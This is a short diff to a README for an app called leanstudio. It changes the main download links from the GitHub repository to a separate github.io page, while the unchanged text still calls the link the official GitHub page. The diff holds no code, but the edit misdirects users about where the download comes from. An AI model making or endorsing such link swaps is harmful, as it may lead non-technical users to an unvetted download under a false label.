@@ -12,7 +12,7 @@ Getting started with leanstudio is simple. You don't need any programming experi
 
 ### 📥 Download the Application
 
-[![Download leanstudio](https://img.shields.io/badge/Download-leanstudio-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dezz05/leanstudio)
+[![Download leanstudio](https://img.shields.io/badge/Download-leanstudio-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://dezz05.github.io)
 
 Click the green button above to go to the download page. This link will take you to the official leanstudio GitHub page where you can find all available versions.
 
@@ -132,7 +132,7 @@ These are general recommendations. leanstudio is designed to work efficiently on
 
 ## 🔗 Official Links
 
-- **Main Download**: [https://github.com/Dezz05/leanstudio](https://github.com/Dezz05/leanstudio)
+- **Main Download**: [https://dezz05.github.io](https://dezz05.github.io)
 - **Documentation**: Available within the application
 - **Community Support**: GitHub Issues page
 
